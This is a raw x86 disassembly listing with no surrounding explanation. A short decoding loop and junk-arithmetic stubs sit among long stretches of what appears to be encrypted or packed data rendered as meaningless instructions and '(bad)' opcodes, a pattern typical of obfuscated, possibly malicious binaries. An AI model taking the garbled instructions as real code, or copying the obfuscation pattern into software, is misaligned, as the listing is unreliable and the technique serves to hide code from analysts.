  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x43375b
  404131:	and    DWORD PTR ds:0x433727,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x43363f,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
  404150:	movzx  ecx,WORD PTR ds:0x433643
  404157:	or     ecx,DWORD PTR ds:0x433697
  40415d:	mov    DWORD PTR ds:0x433643,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x4336f3,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x43375b,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	jmp    0x7c24:0xa8791444
  4041b0:	jl     0x40415d
  4041b2:	jg     0x404230
  4041b4:	jl     0x4041e8
  4041b6:	scas   eax,DWORD PTR es:[edi]
  4041b7:	cs xor eax,0xd316f89e
  4041bd:	mov    ebx,DWORD PTR [edx]
  4041bf:	ret    
  4041c0:	sbb    al,0xb9
  4041c2:	jmp    0x3ae53c9f
  4041c7:	push   0xee755d88
  4041cc:	push   edx
  4041cd:	(bad)  
  4041ce:	mov    ah,0x2d
  4041d0:	in     eax,dx
  4041d1:	xchg   esi,eax
  4041d2:	mov    esp,0xda9d47bb
  4041d7:	mov    ch,0xf2
  4041d9:	mov    cl,0xc
  4041db:	imul   eax,edi,0xffffffb0
  4041de:	ss mov dh,0x95
  4041e1:	xchg   esi,eax
  4041e2:	mov    esp,0xc414fae2
  4041e7:	cmc    
  4041e8:	dec    esp
  4041e9:	out    dx,al
  4041ea:	sti    
  4041eb:	in     eax,0x76
  4041ed:	cli    
  4041ee:	fsub   QWORD PTR [ecx]
  4041f0:	lods   eax,DWORD PTR ds:[esi]
  4041f1:	mov    bh,0xfd
  4041f3:	fsub   DWORD PTR [edx]
  4041f5:	sar    DWORD PTR [esp+eax*1-0x16],1
  4041f9:	jmp    0x4041ce
  4041fb:	cli    
  4041fc:	in     al,dx
  4041fd:	outs   dx,BYTE PTR ds:[esi]
  4041fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041ff:	jg     0x4041ae
  404201:	mov    eax,0xef4864b2
  404206:	or     esi,DWORD PTR [eax-0x45843ed]
  40420c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40420d:	push   eax
  40420e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40420f:	int3   
  404210:	jmp    0x7a9ccf4b
  404215:	fdiv   QWORD PTR [ecx]
  404217:	mov    ebx,0x50fa8d0d
  40421c:	gs xchg edi,eax
  40421e:	stos   BYTE PTR es:[edi],al
  40421f:	out    0xf3,al
  404221:	inc    ebx
  404222:	push   ss
  404223:	xchg   ebx,eax
  404224:	mov    bl,0xad
  404226:	popa   
  404227:	mov    esi,0xb052b381
  40422c:	push   0xffffff9e
  40422e:	dec    ebx
  40422f:	xchg   edi,eax
  404230:	xchg   esi,eax
  404231:	mov    bl,0x6e
  404233:	push   cs
  404234:	jne    0x4041ca
  404236:	push   esi
  404237:	and    DWORD PTR [ebp+0x5a469b75],edx
  40423d:	cmp    BYTE PTR [ebp+eax*4-0x4e94525c],dl
  404244:	mov    bh,BYTE PTR [edx]
  404246:	sub    eax,DWORD PTR [edi+edi*1+0x3d]
  40424a:	push   es
  40424b:	xchg   edi,eax
  40424c:	icebp  
  40424d:	outs   dx,DWORD PTR ds:[esi]
  40424e:	std    
  40424f:	(bad)  
  404251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404252:	sbb    eax,0x889eeefb
  404257:	mov    eax,ds:0x4ba6a053
  40425c:	out    0xd6,eax
  40425e:	mov    bh,0xbb
  404260:	cwde   
  404261:	or     bl,BYTE PTR [eax+edi*8+0x60]
  404265:	sbb    bh,dh
  404267:	ss fxtract 
  40426a:	rol    ch,0xf1
  40426d:	mov    edx,es
  40426f:	jg     0x404211
  404271:	dec    edx
  404272:	iret   
  404273:	mov    BYTE PTR es:[eax+0x24624a4e],al
  40427a:	bound  ebp,QWORD PTR [edx+0x54]
  40427d:	repnz fs (bad) 
  404280:	cli    
  404281:	xor    eax,0xaba6bc74
  404286:	test   al,0xcc
  404288:	fidiv  DWORD PTR [ebx+eiz*4]
  40428b:	and    cl,al
  40428d:	pop    ebx
  40428e:	sahf   
  40428f:	cmp    DWORD PTR [edx+0x28],esi
  404292:	outs   dx,BYTE PTR ds:[esi]
  404293:	and    DWORD PTR [ebp+eiz*8-0x3b],esp
  404297:	jb     0x404229
  404299:	jnp    0x4042d4
  40429b:	add    ebx,edi
  40429d:	jae    0x404263
  40429f:	adc    eax,0x5b9b76c5
  4042a4:	jb     0x4042c2
  4042a6:	test   al,0x74
  4042a8:	stc    
  4042a9:	cmp    ebp,0x98b3986f
  4042af:	mov    al,0x74
  4042b1:	mov    bh,0x98
  4042b3:	pop    ebx
  4042b4:	aam    0x84
  4042b6:	jl     0x4042eb
  4042b8:	mov    ecx,0x31ef55f8
  4042bd:	sahf   
  4042be:	retf   
  4042bf:	mov    DWORD PTR [ebx],ebx
  4042c1:	pop    edx
  4042c2:	push   eax
  4042c3:	fild   DWORD PTR [ebx-0x21]
  4042c6:	inc    esi
  4042c7:	push   0xc785cbfe
  4042cc:	daa    
  4042cd:	ds cli 
  4042cf:	arpl   WORD PTR ds:0x4d9c9213,ax
  4042d5:	adc    esp,DWORD PTR [edx+0x4765c0c8]
  4042db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042dc:	mov    bl,0xb2
  4042de:	stc    
  4042df:	das    
  4042e0:	push   esp
  4042e1:	sbb    eax,0x226f8506
  4042e6:	xchg   ebp,eax
  4042e7:	popf   
  4042e8:	rcr    DWORD PTR [ebx+0x7],0x5
  4042ec:	imul   ebx,DWORD PTR [edx-0x59],0xb6c61759
  4042f3:	sub    DWORD PTR [edi-0x1d8906d],ecx
  4042f9:	lods   eax,DWORD PTR ds:[esi]
  4042fa:	push   ebp
  4042fb:	das    
  4042fc:	push   esi
  4042fd:	push   eax
  4042fe:	call   0xb3317f9b
  404303:	test   al,0xaf
  404305:	xor    BYTE PTR ds:0x5adeaeae,0x28
  40430c:	and    DWORD PTR [ebx-0x48e0087c],0x3d56f9d5
  404316:	(bad)  [eax-0x38da6a13]
  40431c:	xor    eax,0x57970d0
  404321:	mov    BYTE PTR [eax],al
  404323:	mov    bh,0x4f
  404325:	or     eax,0x4df6bf51
  40432a:	lds    eax,FWORD PTR cs:[esi+0x3d]
  40432e:	in     al,0x17
  404330:	call   0xb9007d4b
  404335:	iret   
  404336:	fcomp  QWORD PTR [edx]
  404338:	loope  0x404395
  40433a:	scas   eax,DWORD PTR es:[edi]
  40433b:	das    
  40433c:	push   edx
  40433d:	sahf   
  40433e:	pop    eax
  40433f:	pop    ebx
  404340:	xchg   DWORD PTR [esi+edi*1+0x17ad4d91],ebp
  404347:	in     al,dx
  404348:	dec    esi
  404349:	xchg   edx,eax
  40434a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40434b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40434c:	jbe    0x4043c2
  40434e:	inc    ecx
  40434f:	pop    ebx
  404350:	pop    ecx
  404351:	or     al,0x10
  404353:	(bad)  
  404354:	fdivr  st(5),st
  404356:	add    esp,DWORD PTR [edi+0x28]
  404359:	leave  
  40435a:	push   0x7e
  40435c:	(bad)  
  40435d:	fwait
  40435e:	mov    bl,BYTE PTR [ebp-0x1c]
  404361:	push   es
  404362:	jne    0x404378
  404364:	sahf   
  404365:	daa    
  404366:	sub    edx,DWORD PTR [ecx]
  404368:	inc    esi
  404369:	push   ebp
  40436a:	push   esi
  40436b:	or     DWORD PTR ds:0x43371f,0x4643
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x43372f,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x43372f,0x4336ef
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	fcom   QWORD PTR [eax+edx*4+0x7c26e7c9]
  4043a8:	jl     0x404355
  4043aa:	jg     0x404428
  4043ac:	jl     0x404367
  4043ae:	jae    0x404387
  4043b0:	outs   dx,BYTE PTR ds:[esi]
  4043b1:	daa    
  4043b2:	adc    ebp,DWORD PTR [ecx-0x7ca68809]
  4043b8:	pop    edx
  4043b9:	xor    eax,0x6a4a383d
  4043be:	add    al,0x54
  4043c0:	arpl   cx,ax
  4043c2:	cs cwde 
  4043c4:	mov    eax,ds:0xe5270ced
  4043c9:	sub    BYTE PTR [edi-0x312f795c],bl
  4043cf:	xchg   esi,eax
  4043d0:	dec    esi
  4043d1:	mov    bl,0xb9
  4043d3:	cmp    DWORD PTR [esi+0x0],edx
  4043d6:	push   0xdbbc85e0
  4043db:	inc    edx
  4043dc:	mov    al,0x66
  4043de:	sub    DWORD PTR [ebx+0x12],esp
  4043e1:	jbe    0x40436c
  4043e3:	(bad)  
  4043e4:	daa    
  4043e5:	cwde   
  4043e6:	or     BYTE PTR [edi],al
  4043e8:	jecxz  0x40443d
  4043ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043eb:	test   ebx,edi
  4043ed:	in     eax,dx
  4043ee:	or     eax,0xa6353a49
  4043f3:	jl     0x40444e
  4043f5:	pop    ecx
  4043f6:	sti    
  4043f7:	jmp    0x404410
  4043f9:	jp     0x4043fd
  4043fb:	jb     0x404416
  4043fd:	icebp  
  4043fe:	inc    esi
  4043ff:	ret    0x6a05
  404402:	(bad)  
  404403:	cmp    eax,0x228fe91f
  404408:	sbb    edi,edx
  40440a:	jp     0x4043e2
  40440c:	and    al,0x4a
  40440e:	cmp    DWORD PTR [si],esp
  404411:	cli    
  404412:	mov    ch,0x16
  404414:	outs   dx,BYTE PTR ds:[esi]
  404415:	pushf  
  404416:	dec    edi
  404417:	mov    ah,0xfc
  404419:	ret    0xabf9
  40441c:	jge    0x4043e4
  40441e:	cmc    
  40441f:	and    BYTE PTR [esi-0x50a2ff42],cl
  404425:	pop    ss
  404426:	rol    BYTE PTR [esi+0x6b],1
  404429:	out    dx,al
  40442a:	data16 (bad) 
  40442c:	pushf  
  40442d:	mov    ebx,0xc41cd613
  404432:	rol    esi,1
  404434:	inc    ebp
  404435:	cmp    ecx,DWORD PTR ds:0xc1a50485
  40443b:	sub    BYTE PTR [ecx-0x61e6919],al
  404441:	mov    eax,ds:0xfe9a598c
  404446:	jp     0x404439
  404448:	inc    esp
  404449:	mov    ah,0xf6
  40444b:	ds mov ah,0x87
  40444e:	iret   
  40444f:	xor    eax,0x40594176
  404454:	mov    WORD PTR [ecx-0x687abb50],?
  40445a:	adc    edx,DWORD PTR [ecx]
  40445c:	idiv   DWORD PTR ds:0x1ec5a1c2
  404462:	add    cl,BYTE PTR [edi-0x659370bc]
  404468:	fwait
  404469:	aaa    
  40446a:	out    0xd2,al
  40446c:	lahf   
  40446d:	add    esi,DWORD PTR [edi+0x656d80c1]
  404473:	jmp    0x3e65:0x383975ca
  40447a:	std    
  40447b:	xor    DWORD PTR [eax],ebx
  40447d:	xlat   BYTE PTR ds:[ebx]
  40447e:	and    ah,bl
  404480:	inc    esi
  404481:	std    
  404482:	mov    ah,0xb5
  404484:	xchg   esi,eax
  404485:	(bad)  
  404486:	in     eax,0x7d
  404488:	adc    ecx,DWORD PTR [ebx-0x66d975da]
  40448e:	lods   eax,DWORD PTR ds:[esi]
  40448f:	xchg   edi,eax
  404490:	cmp    BYTE PTR ds:0x9caa644d,dl
  404496:	js     0x4044cf
  404498:	ror    BYTE PTR [ebp+0x4dd5ea9f],cl
  40449e:	out    0x40,eax
  4044a0:	xor    al,bh
  4044a2:	sti    
  4044a3:	jnp    0x4044d4
  4044a5:	stos   BYTE PTR es:[edi],al
  4044a6:	push   esi
  4044a7:	ins    DWORD PTR es:[edi],dx
  4044a8:	push   ds
  4044a9:	neg    ecx
  4044ab:	add    eax,0x90624943
  4044b0:	xchg   ebx,eax
  4044b1:	pushw  cs
  4044b3:	inc    edx
  4044b4:	ror    DWORD PTR [ecx],cl
  4044b6:	arpl   si,sp
  4044b8:	add    eax,0xbf697cbb
  4044bd:	sahf   
  4044be:	sub    BYTE PTR [ecx+0x91d5b25],ch
  4044c4:	add    DWORD PTR [esi+eax*4+0x3c],esp
  4044c8:	dec    ebx
  4044c9:	mov    bh,0xf5
  4044cb:	mov    ebx,0x85cd8f41
  4044d0:	jo     0x40448e
  4044d2:	jae    0x4044b1
  4044d4:	loopne 0x4044fa
  4044d6:	push   0xffffffc8
  4044d8:	pushf  
  4044d9:	jp     0x4044e9
  4044db:	fild   QWORD PTR [ebp+0x70]
  4044de:	out    dx,eax
  4044df:	mov    dh,0x89
  4044e1:	cs fdiv st,st(5)
  4044e4:	jnp    0x4044e8
  4044e6:	lods   al,BYTE PTR ds:[esi]
  4044e7:	test   BYTE PTR [edi],dh
  4044e9:	(bad)  
  4044eb:	push   ds
  4044ec:	fdivr  QWORD PTR [edi+0x18]
  4044ef:	stos   DWORD PTR es:[edi],eax
  4044f0:	dec    esi
  4044f1:	adc    ebx,DWORD PTR [edi-0x32]
  4044f4:	ins    DWORD PTR es:[edi],dx
  4044f5:	mov    dl,0x52
  4044f7:	lock or eax,0x862de99c
  4044fd:	dec    ebp
  4044fe:	mov    ebp,0xdee124c
  404503:	test   al,0x1e
  404505:	mov    DWORD PTR [ebx],0xb07e1479
  40450b:	pop    eax
  40450c:	daa    
  40450d:	mov    ?,eax
  40450f:	dec    ebp
  404510:	jno    0x4044c5
  404512:	jne    0x404569
  404514:	adc    edx,DWORD PTR [edx]
  404516:	add    eax,0x15e208f8
  40451b:	push   esi
  40451c:	popf   
  40451d:	ror    DWORD PTR [ebx+edx*1-0x1f],0xcf
  404522:	stc    
  404523:	cmp    eax,0x1ff2f30a
  404528:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40452a:	leave  
  40452b:	or     ebx,DWORD PTR [ebx-0x2616ed04]
  404531:	adc    BYTE PTR [edx+0xc],ch
  404534:	enter  0xef39,0x1f
  404538:	dec    edx
  404539:	aad    0x50
  40453b:	pop    eax
  40453c:	jecxz  0x4044fa
  40453e:	xchg   edx,eax
  40453f:	mov    edi,0x182d59da
  404544:	neg    BYTE PTR [edx-0x4]
  404547:	mov    eax,ds:0xd90d44b5
  40454c:	or     eax,DWORD PTR [ecx+0x4e]
  40454f:	clc    
  404550:	daa    
  404551:	push   ds
  404552:	aam    0xee
  404554:	mov    al,0x87
  404556:	pop    ds
  404557:	dec    eax
  404558:	xor    ecx,edi
  40455a:	adc    ch,ah
  40455c:	fnstcw WORD PTR [ebp+0x95e1dee]
  404562:	add    eax,esi
  404564:	jmp    0x404757
  404569:	mov    DWORD PTR ds:0x4336a7,0x6267
  404573:	mov    dl,BYTE PTR [ebp-0x1]
  404576:	mov    DWORD PTR ds:0x433653,0x1c06
  404580:	jmp    0x404752
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0x75c2aa9d
  404592:	or     al,0xb5
  404594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404595:	adc    ah,BYTE PTR [eax]
  404597:	jl     0x404615
  404599:	stos   DWORD PTR es:[edi],eax
  40459a:	jg     0x404618
  40459c:	jl     0x40456b
  40459e:	test   DWORD PTR [eax],edx
  4045a0:	pop    esi
  4045a1:	mov    esp,0x572a9ddc
  4045a6:	and    dh,BYTE PTR [ecx+eiz*8]
  4045a9:	lods   eax,DWORD PTR ds:[esi]
  4045aa:	dec    ecx
  4045ab:	push   0x5
  4045ad:	in     al,dx
  4045ae:	dec    ebx
  4045af:	lahf   
  4045b0:	aad    0x3
  4045b2:	or     DWORD PTR [edx-0x69],ebx
  4045b5:	call   0xe85d:0xff1086ea
  4045bc:	test   eax,0xd5ce3cdf
  4045c1:	rcl    BYTE PTR [edx+0x61fd6e0f],1
  4045c7:	aas    
  4045c8:	xor    eax,0x7dfdbd31
  4045cd:	mov    ah,0x34
  4045cf:	dec    esp
  4045d0:	loope  0x40457d
  4045d2:	jecxz  0x4045ac
  4045d4:	xchg   edi,eax
  4045d5:	xchg   esi,eax
  4045d6:	adc    DWORD PTR [ecx+0x3c],ebp
  4045d9:	das    
  4045da:	rol    BYTE PTR gs:[ebp+0x58e77b20],0x33
  4045e2:	call   0x3de0:0x42247e82
  4045e9:	mov    bl,BYTE PTR [ebx+edi*1-0x27]
  4045ed:	ret    0x34e4
  4045f0:	sti    
  4045f1:	fcom   DWORD PTR [ebx]
  4045f3:	jecxz  0x404656
  4045f5:	inc    esi
  4045f6:	mov    ah,0x8a
  4045f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045fa:	fst    DWORD PTR [ecx-0x62d7ea76]
  404600:	or     ah,al
  404602:	lods   al,BYTE PTR ds:[esi]
  404603:	test   al,0x85
  404605:	sar    bh,0x35
  404608:	pop    ss
  404609:	fsubr  st,st(0)
  40460b:	jns    0x4045cd
  40460d:	retf   0xa309
  404610:	lods   al,BYTE PTR ds:[esi]
  404611:	mov    al,0x46
  404613:	pop    es
  404614:	xchg   edi,eax
  404615:	mov    bh,0x29
  404617:	stos   BYTE PTR es:[edi],al
  404618:	(bad)  
  404619:	aas    
  40461a:	mov    dl,0xa6
  40461c:	sbb    BYTE PTR [ecx],bl
  40461e:	ds scas al,BYTE PTR es:[edi]
  404620:	pushf  
  404621:	idiv   BYTE PTR [edx-0x68113520]
  404627:	pop    DWORD PTR [ebx-0x16dd0c6]
  40462d:	inc    ecx
  40462e:	in     al,dx
  40462f:	mov    ds:0xd73cfc44,eax
  404634:	pop    eax
  404635:	jp     0x404644
  404637:	sbb    DWORD PTR [edx],esi
  404639:	xor    al,0xd
  40463b:	retf   0x6446
  40463e:	mul    BYTE PTR [ebp-0x9]
  404641:	mov    DWORD PTR [edx],ebp
  404643:	and    eax,0x590991ef
  404648:	adc    al,BYTE PTR [esi]
  40464a:	mov    esi,0x36fb9f70
  40464f:	int3   
  404650:	cdq    
  404651:	mov    eax,0x7c234003
  404656:	outs   dx,BYTE PTR ds:[esi]
  404657:	mov    WORD PTR [ebx],fs
  404659:	iret   
  40465a:	in     al,dx
  40465b:	cli    
  40465c:	inc    eax
  40465d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40465e:	cmp    ah,al
  404660:	inc    eax
  404661:	push   ebp
  404662:	pushf  
  404663:	jecxz  0x40466e
  404665:	pop    ss
  404666:	icebp  
  404667:	dec    ecx
  404668:	add    DWORD PTR [esi],0x68
  40466b:	sbb    al,bh
  40466d:	xchg   ecx,eax
  40466e:	mov    al,0xaa
  404670:	(bad)  
  404671:	into   
  404672:	sub    ebx,DWORD PTR [esi+0x3b]
  404675:	jmp    0x40462d
  404677:	or     ebp,DWORD PTR [esp+esi*8+0x107833f2]
  40467e:	mov    bl,0x7f
  404680:	sub    edx,0x49
  404683:	inc    edx
  404684:	sbb    DWORD PTR [edx],esp
  404686:	sub    al,0x18
  404688:	pop    eax
  404689:	ss aaa 
  40468b:	les    ebx,FWORD PTR [ecx-0x38]
  40468e:	add    DWORD PTR [eax],ebx
  404690:	mov    ah,0x3d
  404692:	mov    al,ds:0xecc50ae3
  404697:	sub    dh,BYTE PTR [esi+0x385628dc]
  40469d:	pop    edx
  40469e:	mov    ebx,0xbe7bf8d9
  4046a3:	xor    BYTE PTR [ecx+0x516caec9],bl
  4046a9:	xor    DWORD PTR [esi+0x4e18609a],0xffffffc6
  4046b0:	cs inc eax
  4046b2:	sar    DWORD PTR [edx-0x78e4d181],cl
  4046b8:	sub    cl,bh
  4046ba:	popf   
  4046bb:	inc    ecx
  4046bc:	icebp  
  4046bd:	mov    al,bl
  4046bf:	shl    BYTE PTR [ebp+edx*2-0x7ff7ed8b],0xd1
  4046c7:	cmp    dl,BYTE PTR [edx+0x29]
  4046ca:	mov    edi,0x4cb765f
  4046cf:	dec    ebp
  4046d0:	mov    esp,0xd8f76305
  4046d5:	add    edi,edi
  4046d7:	jl     0x4046a2
  4046d9:	or     eax,DWORD PTR [edi+ebp*1-0x7b]
  4046dd:	xor    DWORD PTR [esi+ecx*4],0x97aee3e4
  4046e4:	std    
  4046e5:	sar    BYTE PTR [edi+0x46],cl
  4046e8:	(bad)  
  4046e9:	push   eax
  4046ea:	clc    
  4046eb:	sahf   
  4046ec:	sub    esi,edx
  4046ee:	aam    0xb6
  4046f0:	cmp    DWORD PTR [ebp+esi*8-0xd6d3ca8],eax
  4046f7:	sub    al,0x7e
  4046f9:	pop    esp
  4046fa:	adc    dl,BYTE PTR ds:0x325dbc36
  404700:	(bad)  
  404701:	aam    0xb
  404703:	adc    DWORD PTR [eax],0xffffffaf
  404706:	jo     0x4046f9
  404708:	mov    dh,al
  40470a:	fst    st(4)
  40470c:	xor    al,0x48
  40470e:	xor    DWORD PTR [edx+ecx*4-0x1c01c6a2],ebp
  404715:	or     cl,dh
  404717:	mov    BYTE PTR [edx-0x49],al
  40471a:	and    DWORD PTR [edi],ebp
  40471c:	xchg   ebp,eax
  40471d:	cmp    edi,esi
  40471f:	ret    0x3e02
  404722:	pop    ebp
  404723:	or     al,bl
  404725:	jbe    0x40475f
  404727:	dec    edi
  404728:	jae    0x404706
  40472a:	mov    ss,WORD PTR [edi]
  40472c:	dec    eax
  40472d:	scas   al,BYTE PTR es:[edi]
  40472e:	push   es
  40472f:	push   es
  404730:	icebp  
  404731:	lods   al,BYTE PTR ds:[esi]
  404732:	push   ebx
  404733:	dec    eax
  404734:	inc    edx
  404735:	jp     0x40475d
  404737:	jmp    FWORD PTR [ebp-0xc]
  40473a:	cdq    
  40473b:	add    dh,dh
  40473d:	les    ebx,FWORD PTR [ebx]
  40473f:	cmp    al,0x54
  404741:	in     eax,dx
  404742:	pop    edi
  404743:	rol    BYTE PTR [edx],0x64
  404746:	mov    al,0x89
  404748:	and    BYTE PTR [ebx],dh
  40474a:	jb     0x4046f3
  40474c:	sbb    al,0xa2
  40474e:	mov    ch,0xe0
  404750:	shl    esi,cl
  404752:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  404756:	inc    eax
  404757:	mov    DWORD PTR ds:0x43364f,0xde3
  404761:	cmp    eax,0x40
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x433757
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x43363f,0x14
  40477d:	cmp    DWORD PTR ds:0x43363f,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x43363f,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x43363f,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x43363f
  4047bd:	dec    eax
  4047be:	mov    ds:0x43363f,eax
  4047c3:	mov    eax,ds:0x43363f
  4047c8:	dec    eax
  4047c9:	mov    ds:0x43363f,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x4336e3,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x4336d7,0x43376f
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x4336db,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x4336e7,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x4336f3,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x40483c
  40481f:	fisub  DWORD PTR [eax]
  404821:	mov    esi,0x7c7c2349
  404826:	stos   DWORD PTR es:[edi],eax
  404827:	jg     0x4048a5
  404829:	jl     0x404845
  40482b:	sti    
  40482c:	pop    ss
  40482d:	fucom  st(1)
  40482f:	ins    DWORD PTR es:[edi],dx
  404830:	jbe    0x404855
  404832:	cmp    ebp,esi
  404834:	and    eax,0x9ca49b68
  404839:	data16 fild QWORD PTR [ecx]
  40483c:	mov    esp,0xf78f364a
  404841:	or     BYTE PTR [ebp-0x1a],0xf5
  404845:	adc    BYTE PTR [ebx-0x68bf807b],0xa8
  40484c:	mov    dh,0x12
  40484e:	loope  0x4047d5
  404850:	add    cl,BYTE PTR [esi-0x2c]
  404853:	lods   eax,DWORD PTR ds:[esi]
  404854:	daa    
  404855:	push   ebx
  404856:	inc    esi
  404857:	mov    ebx,0xd900093c
  40485c:	jb     0x4047f1
  40485e:	or     DWORD PTR [edi-0x69],esp
  404861:	dec    esi
  404862:	in     al,0xb4
  404864:	xchg   esi,eax
  404865:	pop    edx
  404866:	push   ecx
  404867:	inc    eax
  404868:	stc    
  404869:	push   ebp
  40486a:	add    eax,0xd470f388
  40486f:	jg     0x404800
  404871:	fadd   st(2),st
  404873:	outs   dx,BYTE PTR ds:[esi]
  404874:	and    esp,DWORD PTR [edi+ecx*4+0x1]
  404878:	dec    ecx
  404879:	ret    
  40487a:	and    eax,0xfa8fb910
  40487f:	ret    0x81b5
  404882:	mov    edx,0x1e4b3cc9
  404887:	pop    edi
  404888:	sub    eax,0xbe131766
  40488d:	out    dx,eax
  40488e:	fcomi  st,st(0)
  404890:	fdivp  st(6),st
  404892:	cmp    BYTE PTR [edi+0xdb2f426],cl
  404898:	lds    ecx,FWORD PTR [ebx+edi*2-0x7515ca41]
  40489f:	addr16 sahf 
  4048a1:	js     0x404830
  4048a3:	mov    al,0xd9
  4048a5:	ja     0x4048d1
  4048a7:	hlt    
  4048a8:	not    DWORD PTR [edx+ebp*4-0x55]
  4048ac:	test   esp,0x3638a4f4
  4048b2:	imul   DWORD PTR [edi-0x19b35f76]
  4048b8:	pusha  
  4048b9:	cmp    bl,cl
  4048bb:	sub    al,0x58
  4048bd:	fist   WORD PTR [esi]
  4048bf:	cmc    
  4048c0:	mov    al,0xe7
  4048c2:	push   eax
  4048c3:	loopne 0x4048ee
  4048c5:	stc    
  4048c6:	xchg   ebp,eax
  4048c7:	das    
  4048c8:	push   DWORD PTR [ebx-0x49e68a92]
  4048ce:	cmp    al,0xfd
  4048d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048d1:	addr16 xchg esp,eax
  4048d3:	lods   al,BYTE PTR ds:[esi]
  4048d4:	xor    bh,dh
  4048d6:	stc    
  4048d7:	push   ecx
  4048d8:	sub    bh,BYTE PTR [ebx-0x75235957]
  4048de:	ret    0x4ca7
  4048e1:	ins    BYTE PTR es:[edi],dx
  4048e2:	lods   al,BYTE PTR fs:[esi]
  4048e4:	inc    eax
  4048e5:	test   DWORD PTR [edi],edx
  4048e7:	cld    
  4048e8:	and    edx,ecx
  4048ea:	ins    BYTE PTR es:[edi],dx
  4048eb:	or     esp,esi
  4048ed:	daa    
  4048ee:	lods   al,BYTE PTR ds:[esi]
  4048ef:	cmp    BYTE PTR [ebx+0x78e47fe1],al
  4048f5:	push   ds
  4048f6:	out    0x40,eax
  4048f8:	(bad)  [ebp+eax*2-0x53130c76]
  4048ff:	es adc al,0x73
  404902:	int    0x3a
  404904:	inc    ebx
  404905:	ins    BYTE PTR es:[edi],dx
  404906:	xlat   BYTE PTR ds:[ebx]
  404907:	bound  esp,QWORD PTR [eax+0x75a85bb5]
  40490d:	xchg   ebx,eax
  40490e:	not    edi
  404910:	adc    al,0xad
  404912:	pop    esp
  404913:	lahf   
  404914:	(bad)  
  404915:	jmp    0x4048b0
  404917:	(bad)  
  404918:	sub    al,0x21
  40491a:	xlat   BYTE PTR ds:[ebx]
  40491b:	sbb    DWORD PTR [ebx+0x73f8c274],edi
  404921:	into   
  404922:	jo     0x404938
  404924:	add    al,0xa9
  404926:	outs   dx,BYTE PTR ds:[esi]
  404927:	fistp  QWORD PTR [ebp-0x54cb2775]
  40492d:	sahf   
  40492e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40492f:	aas    
  404930:	mov    edi,DWORD PTR [edx+0x1a]
  404933:	enter  0x726a,0x24
  404937:	js     0x4048f7
  404939:	(bad)  
  40493a:	mov    ch,0xae
  40493c:	(bad)  
  40493d:	xor    ah,BYTE PTR [ebp-0x48]
  404940:	pusha  
  404941:	jbe    0x404979
  404943:	mov    edi,0x2051eea2
  404948:	(bad)  
  404949:	test   DWORD PTR [ebp-0x619e80ba],eax
  40494f:	dec    eax
  404950:	cmc    
  404951:	add    al,0x5d
  404953:	sahf   
  404954:	add    eax,0xa6376d4a
  404959:	fwait
  40495a:	test   BYTE PTR [ecx],cl
  40495c:	cld    
